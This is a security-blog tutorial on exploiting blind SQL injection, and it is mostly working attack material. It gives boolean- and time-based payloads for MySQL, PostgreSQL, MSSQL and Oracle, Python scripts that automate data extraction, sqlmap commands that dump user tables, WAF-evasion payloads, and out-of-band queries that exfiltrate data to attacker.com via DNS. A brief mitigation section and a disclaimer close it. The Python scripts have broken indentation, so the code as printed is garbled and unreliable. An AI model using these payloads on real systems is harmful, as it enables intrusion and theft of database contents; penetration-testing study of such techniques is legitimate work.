---
title: Blind SQL Injection — Extracting Data Without Seeing the Output
date: 2025-02-10T00:00:00.000Z
description: >-
  Blind SQL Injection exploitation techniques (boolean-based and time-based)
  for data extraction when the application returns no visible errors.
category: web
os:
  - linux
  - windows
difficulty: hard
mitre_tactic: TA0006
mitre_technique: T1190
tags:
  - sqli
  - blind
  - web
  - database
  - boolean-based
  - time-based
  - sqlmap
status: published
lang: en
readingTime: 12
lang_original: pt
translated: true
translated_at: '2026-03-04'
---

## What is Blind SQL Injection?

**Blind SQL Injection** occurs when an application is vulnerable to SQL Injection, but **does not return query results** or error messages in the HTTP response. The attacker must infer the database content based on indirect application behaviors.

There are two main types:

| Type | Mechanism | Speed |
|------|-----------|------------|
| Boolean-based | Evaluates TRUE/FALSE in the response | Slow |
| Time-based | Measures response delay (SLEEP) | Very slow |
| Error-based | Causes errors with embedded data | Fast |
| Out-of-band | Exfiltration via DNS/HTTP | Fast |

---

## Identifying the vulnerability

### Basic injection test

```http
GET /user?id=1 HTTP/1.1
Host: target.com
```

Inject Boolean conditions and observe differences in response:

```
# TRUE condition — normal response
/user?id=1 AND 1=1--

# FALSE condition — different response (no content, redirect, etc.)
/user?id=1 AND 1=2--
```

If the responses are **visibly different** between TRUE and FALSE, the endpoint is vulnerable to boolean-based blind SQLi.

### Time-based test

```
# MySQL / MariaDB
/user?id=1 AND SLEEP(5)--

# PostgreSQL
/user?id=1 AND pg_sleep(5)--

# MSSQL
/user?id=1; WAITFOR DELAY &#x27;0:0:5&#x27;--

# Oracle
/user?id=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE(&#x27;a&#x27;,5)--
```

If the response takes exactly **5 seconds**, the backend is vulnerable.

---

## Boolean-Based Exploitation (Manual)

The technique consists of asking **yes/no** questions to the database, extracting one character at a time.

### Identifying the database

```sql
-- MySQL
1 AND SUBSTRING(@@version,1,1)=&#x27;5&#x27;--

-- PostgreSQL
1 AND SUBSTRING(version(),1,10)=&#x27;PostgreSQL&#x27;--

-- MSSQL
1 AND SUBSTRING(@@version,1,9)=&#x27;Microsoft&#x27;--
```

### Extracting the name of the current database

```sql
-- Name length
1 AND LENGTH(database())=6--

-- First character
1 AND SUBSTRING(database(),1,1)=&#x27;d&#x27;--

-- Second character
1 AND SUBSTRING(database(),2,1)=&#x27;v&#x27;--
```

### Python script for boolean-based automation

```python
#!/usr/bin/env python3
# blind_sqli_extract.py — Boolean-based extractor

import requests
import string
import sys

TARGET = &quot;http://target.com/user&quot;
PARAM  = &quot;id&quot;
CHARS  = string.ascii_lowercase + string.digits + &quot;_-@.&quot;

def inject(payload: str) -&gt; bool:
    &quot;&quot;&quot;Returns True if the injection condition is TRUE.&quot;&quot;&quot;
    params = {PARAM: f&quot;1 AND ({payload})-- -&quot;}
    r = requests.get(TARGET, params=params, timeout=10)
    # Adjust the marker to whatever differentiates TRUE from FALSE
    return &quot;Welcome&quot; in r.text

def extract_string(query: str, max_len: int = 64) -&gt; str:
    &quot;&quot;&quot;Extract a string value one character at a time.&quot;&quot;&quot;
    result = &quot;&quot;
    for pos in range(1, max_len + 1):
        found = False
        for ch in CHARS:
            payload = f&quot;SUBSTRING(({query}),{pos},1)=&#x27;{ch}&#x27;&quot;
            if inject(payload):
                result += ch
                sys.stdout.write(ch)
                sys.stdout.flush()
                found = True
                break
        if not found:
        break  # End of string
    print()
    return result

if __name__ == &quot;__main__&quot;:
    print(&quot;[*] Extracting database name...&quot;)
    db = extract_string(&quot;SELECT database()&quot;)
    print(f&quot;[+] Database: {db}&quot;)

    print(&quot;[*] Extracting first table name...&quot;)
    table = extract_string(
        f&quot;SELECT table_name FROM information_schema.tables &quot;
        f&quot;WHERE table_schema=&#x27;{db}&#x27; LIMIT 1&quot;
    )
    print(f&quot;[+] First table: {table}&quot;)

    print(&quot;[*] Extracting columns...&quot;)
    cols = extract_string(
        f&quot;SELECT GROUP_CONCAT(column_name) FROM information_schema.columns &quot;
        f&quot;WHERE table_name=&#x27;{table}&#x27;&quot;
    )
    print(f&quot;[+] Columns: {cols}&quot;)
```

---

## Time-Based Exploitation (Manual)

When there is no visual difference in the response, use time delays as a channel of information.

```python
#!/usr/bin/env python3
# time_based_sqli.py — Time-based extractor

import requests
import string
import time
import sys

TARGET    = &quot;http://target.com/user&quot;
PARAM     = &quot;id&quot;
DELAY     = 3      # seconds to sleep if TRUE
THRESHOLD = 2.5    # detection threshold
CHARS     = string.ascii_lowercase + string.digits + &quot;_-@.&quot;

def inject_time(payload: str) -&gt; bool:
    &quot;&quot;&quot;Returns True if the response took longer than THRESHOLD.&quot;&quot;&quot;
    full = f&quot;1 AND IF(({payload}), SLEEP({DELAY}), 0)-- -&quot;
    params = {PARAM: full}
    start = time.time()
    try:
        requests.get(TARGET, params=params, timeout=DELAY + 5)
    except requests.exceptions.Timeout:
        return True
elapsed = time.time() - start
return elapsed &gt;= THRESHOLD

def extract_string(query: str, max_len: int = 64) -&gt; str:
result = &quot;&quot;
for pos in range(1, max_len + 1):
found = False
        for ch in CHARS:
            payload = f&quot;SUBSTRING(({query}),{pos},1)=&#x27;{ch}&#x27;&quot;
            if inject_time(payload):
                result += ch
                sys.stdout.write(ch)
                sys.stdout.flush()
                found = True
                break
        if not found:
            break
    print()
    return result

if __name__ == &quot;__main__&quot;:
    print(&quot;[*] Time-based extraction — this will be slow...&quot;)
    db = extract_string(&quot;SELECT database()&quot;)
    print(f&quot;[+] Database: {db}&quot;)
```

&gt; **NOTE:** Time-based SQLi is extremely slow for long strings. Use binary search (ascii range) to optimize.

### Optimization with Binary Search

```python
def extract_char_binary(query: str, pos: int) -&gt; str:
    &quot;&quot;&quot;Extract a single character using binary search on ASCII value.&quot;&quot;&quot;
    lo, hi = 32, 126  # printable ASCII range
    while lo &lt; hi:
        mid = (lo + hi) // 2
        payload = f&quot;ASCII(SUBSTRING(({query}),{pos},1))&gt;{mid}&quot;
        if inject_time(payload):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo) if 32 &lt;= lo &lt;= 126 else &#x27;&#x27;
```

---

## Using sqlmap

For professional automation, **sqlmap** is the standard tool.

```bash
# Basic detection
sqlmap -u &quot;http://target.com/user?id=1&quot; --batch

# Force specific techniques
sqlmap -u &quot;http://target.com/user?id=1&quot; \
  --technique=BT \
  --batch \
  --level=3 \
  --risk=2

# Extract database, tables, and dump
sqlmap -u &quot;http://target.com/user?id=1&quot; \
  --dbs \
  --batch

sqlmap -u &quot;http://target.com/user?id=1&quot; \
  -D target_db \
  --tables \
  --batch

sqlmap -u &quot;http://target.com/user?id=1&quot; \
  -D target_db \
  -T users \
  --dump \
  --batch

# Via POST request
sqlmap -u &quot;http://target.com/login&quot; \
  --data=&quot;username=admin&amp;password;=test&quot; \
  -p username \
  --batch

# Via Burp intercepted request
sqlmap -r request.txt --batch --level=5

# With authenticated session cookie
sqlmap -u &quot;http://target.com/profile?id=1&quot; \
  --cookie=&quot;session=abc123; csrftoken=xyz&quot; \
  --batch
```

### sqlmap with proxy (Burp Suite)

```bash
sqlmap -u &quot;http://target.com/user?id=1&quot; \
  --proxy=&quot;http://127.0.0.1:8080&quot; \
  --batch \
  --tamper=space2comment,randomcase
```

---

## WAF bypass

### Useful sqlmap tamper scripts

```bash
# Space → SQL comment
--tamper=space2comment

# Random case: SELECT → SeLeCt
--tamper=randomcase

# Encode URL payloads
--tamper=percentage

# Combine multiple tampers
--tamper=space2comment,randomcase,between
```

### Manually obfuscated payloads

```sql
-- Spaces replaced with comments
1/**/AND/**/1=1--

-- Inline comments to separate keywords
1 /*!AND*/ 1=1--

-- Hex encoding of strings
1 AND SUBSTRING(database(),1,1)=0x64--

-- Double URL encoding (for WAFs that decode once)
%2527  →  %27  →  &#x27;
```

---

## Out-of-Band (OOB) Exfiltration

When both boolean and time-based are blocked, exfiltrate via DNS or HTTP.

### MySQL — DNS Exfiltration

```sql
-- Requires FILE privilege and external DNS resolution
SELECT LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,
  (SELECT database()),
  &#x27;.attacker.com\\share&#x27;))--
```

### MSSQL — xp_dirtree DNS

```sql
-- Via xp_dirtree (no need for xp_cmdshell)
EXEC master.dbo.xp_dirtree
  &#x27;\\&#x27; + (SELECT TOP 1 table_name FROM information_schema.tables) + &#x27;.attacker.com\x&#x27;--
```

### Capturing with interactsh or Burp Collaborator

```bash
# Start listener with interactsh-client
interactsh-client -v

# Your callback URL is: xxxx.interactsh.com
# Use in payload:
# &#x27; AND LOAD_FILE(CONCAT(&#x27;\\\\&#x27;, database(), &#x27;.xxxx.interactsh.com\\x&#x27;))--
```

---

## Mitigation

| Vector | Recommended Control |
|-------|----------------------|
| Dynamic query | Use **Prepared Statements** / Parameterized Queries |
| Insecure ORM | Avoid raw queries; use ORMs with bind parameters |
| Verbose errors | Disable stack traces in production |
| Lack of WAF | Implement WAF with OWASP CRS rules |
| Excessive permissions | DB user should only have SELECT on necessary tables |
| OOB via DNS | Block outgoing DNS resolution on the DB server |

```python
# SECURE: Parameterized query in Python (psycopg2)
import psycopg2

conn = psycopg2.connect(&quot;dbname=app user=readonly&quot;)
cur  = conn.cursor()

user_id = request.args.get(&quot;id&quot;)
cur.execute(&quot;SELECT username FROM users WHERE id = %s&quot;, (user_id,))
row = cur.fetchone()
```

---

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [sqlmap documentation](https://sqlmap.org/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/blind)

&gt; **DISCLAIMER:** This content is intended exclusively for authorized security professionals. The use of these techniques on systems without explicit authorization is illegal. KBM Security is not responsible for misuse.
